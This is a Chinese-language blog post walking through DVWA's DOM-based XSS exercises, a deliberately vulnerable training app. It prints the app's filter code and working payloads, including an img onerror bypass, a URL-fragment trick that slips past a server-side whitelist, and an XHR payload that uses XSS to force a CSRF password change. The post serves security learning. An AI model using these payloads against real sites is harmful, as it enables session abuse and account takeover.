<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>DVWA上手记录-DOM型XSS</title><meta content=DVWA上手记录-DOM型XSS name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=DVWA上手记录-DOM型XSS property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/ property=twitter:url><meta content=DVWA上手记录-DOM型XSS property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>DVWA上手记录-DOM型XSS</h1><p class=author-line>作于：2022-04-28 15:17 ，预计阅读时间 4 分钟<article><h2 id=qian-yan>前言</h2><p>终于做到了XSS题。先尝试把DOM型XSS做完。<h2 id=yuan-li>原理</h2><p>用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。<h2 id=jie-ti>解题</h2><h3 id=lownan-du-shou-ji-xin-xi>Low难度：收集信息</h3><p><img alt=image-20220428135841918 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428135841918.webp><p><img alt=image-20220428135846382 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428135846382.webp><p><img alt=image-20220428140052002 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428140052002.webp><p>所有值得关注的东西就是这些。<p>目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。<h3 id=lownan-du-jie-ti>Low难度：解题</h3><p>两个写入DOM的地方，一个是 <code>+ lang +</code>，一个是 <code>decodeURI(lang)</code>。<code>decodeURI</code>更好操作一些，尝试注入一个合法标签，直接写<code>&lt;script>alert(1);&lt;/script></code>。<p><img alt=image-20220428142334193 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428142334193.webp><p>注入成功。<h3 id=mediumnan-du-jie-ti>Medium难度：解题</h3><p>惊了，看起来js没变化。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>location</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>href</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>indexOf</span><span>(</span><span style=color:#b8bb26>"default="</span><span>) </span><span style=color:#fe8019>>= </span><span style=color:#d3869b>0</span><span>) {
</span><span>    </span><span style=color:#fa5c4b>var </span><span style=color:#fdf4c1>lang </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>location</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>href</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>substring</span><span>(</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>location</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>href</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>indexOf</span><span>(</span><span style=color:#b8bb26>"default="</span><span>)</span><span style=color:#fe8019>+</span><span style=color:#d3869b>8</span><span>);
</span><span>    </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>write</span><span>(</span><span style=color:#b8bb26>"&lt;option value='" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>lang </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>"'>" </span><span style=color:#fe8019>+ </span><span style=color:#fabd2f>decodeURI</span><span>(</span><span style=color:#fdf4c1>lang</span><span>) </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>"&lt;/option>"</span><span>);
</span><span>    </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>write</span><span>(</span><span style=color:#b8bb26>"&lt;option value='' disabled='disabled'>----&lt;/option>"</span><span>);
</span><span>}
</span><span>
</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>write</span><span>(</span><span style=color:#b8bb26>"&lt;option value='English'>English&lt;/option>"</span><span>);
</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>write</span><span>(</span><span style=color:#b8bb26>"&lt;option value='French'>French&lt;/option>"</span><span>);
</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>write</span><span>(</span><span style=color:#b8bb26>"&lt;option value='Spanish'>Spanish&lt;/option>"</span><span>);
</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>write</span><span>(</span><span style=color:#b8bb26>"&lt;option value='German'>German&lt;/option>"</span><span>);
</span></code></pre><p>尝试用Low难度的payload，发现被跳转：<p><img alt=image-20220428142754536 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428142754536.webp><p>大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>
</span><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// Is there any input?
</span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>array_key_exists</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>"default"</span><span style=color:#fdf4c1>, $_GET ) </span><span style=color:#fe8019>&& !</span><span style=color:#fabd2f>is_null </span><span style=color:#fdf4c1>($_GET[ </span><span style=color:#b8bb26>'default' </span><span style=color:#fdf4c1>]) ) {
</span><span style=color:#fdf4c1>    $default </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_GET[</span><span style=color:#b8bb26>'default'</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>    
</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic># Do not allow script tags
</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>stripos </span><span style=color:#fdf4c1>($default, </span><span style=color:#b8bb26>"&lt;script"</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>!== </span><span style=color:#d3869b>false</span><span style=color:#fdf4c1>) {
</span><span style=color:#fdf4c1>        </span><span style=color:#fabd2f>header </span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"location: ?default=English"</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>exit</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span>?>
</span></code></pre><p>一个很鸡的过滤，<code>stripos</code>忽略大小写所以大小写 bypass 不行，一次 URI 编码也不行。考虑不用 <code>script</code> 标签，直接把 <code>option</code>和<code>select</code> 标签闭合了，然后插一个别的标签比如<code>img</code>。<p>payload就改成这样。<pre class=language-html data-lang=html style=color:#fdf4c1aa;background-color:#282828><code class=language-html data-lang=html><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>option</span><span style=color:#83a598>>&lt;/</span><span style=color:#8ec07c;font-weight:700>select</span><span style=color:#83a598>>&lt;</span><span style=color:#8ec07c;font-weight:700>img </span><span style=color:#8ec07c>src=</span><span style=color:#b8bb26>"" </span><span style=color:#8ec07c>onerror=alert(1)</span><span style=color:#83a598>>
</span></code></pre><p><img alt=image-20220428144330839 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428144330839-16511282123961.webp><p>也暴力解开了。<h3 id=highnan-du-jie-ti>High难度：解题</h3><p>还是直接试一次刚才的payload，果不其然302了。看看代码。<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fdf4c1>
</span><span style=color:#928374;font-style:italic>// Is there any input?
</span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>( </span><span style=color:#fabd2f>array_key_exists</span><span style=color:#fdf4c1>( </span><span style=color:#b8bb26>"default"</span><span style=color:#fdf4c1>, $_GET ) </span><span style=color:#fe8019>&& !</span><span style=color:#fabd2f>is_null </span><span style=color:#fdf4c1>($_GET[ </span><span style=color:#b8bb26>'default' </span><span style=color:#fdf4c1>]) ) {
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>    </span><span style=color:#928374;font-style:italic># White list the allowable languages
</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>switch </span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'default'</span><span style=color:#fdf4c1>]) {
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#b8bb26>"French"</span><span style=color:#fdf4c1>:
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#b8bb26>"English"</span><span style=color:#fdf4c1>:
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#b8bb26>"German"</span><span style=color:#fdf4c1>:
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>case </span><span style=color:#b8bb26>"Spanish"</span><span style=color:#fdf4c1>:
</span><span style=color:#fdf4c1>            </span><span style=color:#928374;font-style:italic># ok
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>break</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>default</span><span style=color:#fdf4c1>:
</span><span style=color:#fdf4c1>            </span><span style=color:#fabd2f>header </span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"location: ?default=English"</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>            </span><span style=color:#fa5c4b>exit</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span>?>
</span></code></pre><p>白名单？这我有点不懂了。想一想先。<p>想 bypass 显然不能等进入 <code>switch</code>，只能在 <code>if</code> 这里就直接过，所以问题就是<code>array_key_exists</code>和<code>is_null</code>这两个函数能不能 bypass 。<p>没什么用的分析略，行不通。<p>不过还是有办法，可以用 URL 里的 Fragment。（url里的<code>#fragment</code>部分）。因为JS代码里是这么写的：<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>var </span><span style=color:#fdf4c1>lang </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>location</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>href</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>substring</span><span>(</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>location</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>href</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>indexOf</span><span>(</span><span style=color:#b8bb26>"default="</span><span>)</span><span style=color:#fe8019>+</span><span style=color:#d3869b>8</span><span>);
</span></code></pre><p>直接从<code>href</code>里取<code>substring</code>，偏移值是<code>href.indexOf</code>获得，并没有考虑是从 QueryString 还是 Fragment 取值。所以完全可以把原先的payload加上一个<code>#</code>解决问题。<p><img alt=image-20220428145238725 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428145238725.webp><p>好吧，我承认看了下帮助，差点钻了php的牛角尖，去硬找方法 bypass 服务端的检查。<h3 id=csrf-jie-ti>CSRF：解题</h3><p>主要是解决 Cookies 默认 <code>samesite: lax</code> 导致的 xhr 行不通的问题。<p>把 payload 改成下面这样。<pre class=language-html data-lang=html style=color:#fdf4c1aa;background-color:#282828><code class=language-html data-lang=html><span style=color:#83a598>&lt;/</span><span style=color:#8ec07c;font-weight:700>option</span><span style=color:#83a598>>&lt;/</span><span style=color:#8ec07c;font-weight:700>select</span><span style=color:#83a598>>&lt;</span><span style=color:#8ec07c;font-weight:700>img </span><span style=color:#8ec07c>src=</span><span style=color:#b8bb26>"" </span><span style=color:#8ec07c>onerror=</span><span style=color:#b8bb26>"</span><span style=color:#fa5c4b>let </span><span style=color:#fdf4c1>xhr </span><span style=color:#fe8019>= new </span><span style=color:#8ec07c>XMLHttpRequest</span><span style=color:#fdf4c1>(); xhr.open(</span><span style=color:#b8bb26>'get'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'http://localhost:8080/vulnerabilities/csrf/?password_new=xss&password_conf=xss&Change=Change'</span><span style=color:#fdf4c1>); xhr.withCredentials</span><span style=color:#fe8019>=</span><span style=color:#d3869b>true</span><span style=color:#fdf4c1>; xhr.send();</span><span style=color:#b8bb26>"</span><span style=color:#83a598>>
</span></code></pre><p><img alt=image-20220428150236560 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428150236560.webp><p><img alt=image-20220428150255678 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428150255678.webp><p>然后验证下修改的密码<code>xss</code>是否有效。<p><img alt=image-20220428150319091 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-09/image-20220428150319091.webp><p>相应的，提高到 Medium 和 High 难度其实也没有难度了。<p>Medium难度的 CSRF 只检查了 Host，XSS 方式发起的 CSRF 攻击无法通过检查同源和<code>Host</code>来解决。但严格检查 <code>Referer</code> 的话还是有可能发现的。<p>High 难度的 CSRF 添加了 <code>csrf_token</code>，但是 XSS 方式发起攻击完全可以 xhr 请求到表单页面的 HTML，也就可以拿到 token，<code>csrf_token</code> 无法防御。<h2 id=zong-jie>总结</h2><p>这个 XSS 题花样还是有点少，我还是挺期待能把大佬玩出花的 XSS payload 都学一学在什么场景玩，什么原因研发出来的。<p>将来有机会应该会找找有没有比较好玩的 XSS 靶场练练手。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/dvwa>/dvwa/</a> <a href=/tags/xss>/xss/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>